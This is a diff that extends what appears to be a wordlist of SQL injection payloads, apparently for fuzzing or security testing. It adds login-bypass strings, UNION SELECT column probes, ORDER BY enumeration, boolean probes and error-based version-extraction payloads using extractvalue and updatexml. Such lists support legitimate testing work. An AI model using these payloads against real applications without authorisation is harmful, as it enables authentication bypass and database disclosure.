@@ -1,9 +1,29 @@
 '
 "
+`
 ')
+'))
 ';--
+'"
 ' OR '1'='1
 ' OR 1=1-- -
 " OR "1"="1
+') OR ('1'='1
+' OR '1'='1'#
+' OR 1=1#
+admin'--
+admin' #
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
 1' ORDER BY 1-- -
+1' ORDER BY 10-- -
 ' AND 1=CONVERT(int,@@version)-- -
+' AND extractvalue(1,concat(0x7e,version()))-- -
+' AND updatexml(1,concat(0x7e,version()),1)-- -
+1 AND 1=1
+1 AND 1=2
+' AND '1'='2
+1'||'
+0x27
+%27
